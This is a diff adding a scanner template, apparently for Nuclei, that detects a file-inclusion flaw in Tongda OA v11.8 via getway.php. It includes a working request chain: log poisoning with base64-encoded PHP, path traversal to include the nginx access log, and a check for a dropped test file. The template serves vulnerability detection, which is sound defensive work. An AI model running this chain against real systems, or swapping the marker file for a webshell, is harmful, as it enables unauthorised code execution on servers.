@@ -1,0 +1,55 @@
+id: TongDa-10
+
+info:
+  name: 通达OA v11.8 getway.php 远程文件包含漏洞
+  author: pussycat0x
+  severity: high
+  description: |
+    通达OA v11.8 getway.php 存在文件包含漏洞，攻击者通过发送恶意请求包含日志文件导致任意文件写入漏洞
+  reference:
+    - https://github.com/Threekiii/Vulnerability-Wiki/blob/master/docs-base/docs/oa/%E9%80%9A%E8%BE%BEOA-v11.7-auth_mobi.php-%E5%9C%A8%E7%BA%BF%E7%94%A8%E6%88%B7%E7%99%BB%E5%BD%95%E6%BC%8F%E6%B4%9E.md
+  metadata:
+    verified: true
+    max-request: 1
+    fofa-query: app="TDXK-通达OA"
+  tags: TongDa,OA,任意文件上传漏洞
+request:
+  - raw:
+      - |
+        GET /d1a4278d?json={}&aa=<?php @fputs(fopen(base64_decode('U2VjdGVzdDAwMDEucGhw'),w),base64_decode('PD9waHAgZWNobyAxOz8+'));?> HTTP/1.1
+        Host: {{RootURL}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.77 Safari/537.36
+        Accept-Encoding: gzip
+      - |
+        POST /ispirit/interface/gateway.php HTTP/1.1
+        Host: {{RootURL}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.77 Safari/537.36
+        Content-Length: 54
+        Content-Type: application/x-www-form-urlencoded
+        Accept-Encoding: gzip
+        
+        json={"url":"/general/../../nginx/logs/oa.access.log"}
+      - |
+        POST /mac/gateway.php HTTP/1.1
+        Host: {{RootURL}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.77 Safari/537.36
+        Content-Length: 54
+        Content-Type: application/x-www-form-urlencoded
+        Accept-Encoding: gzip
+
+        json={"url":"/general/../../nginx/logs/oa.access.log"}
+      - |
+        GET /mac/Sectest0001.php HTTP/1.1
+        Host: {{RootURL}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.77 Safari/537.36
+        Accept-Encoding: gzip
+    matchers-condition: and
+    matchers:
+      - type: status
+        part: status_3
+        status:
+          - 200
+      - type: word
+        part: body_3
+        words:
+          - "1"
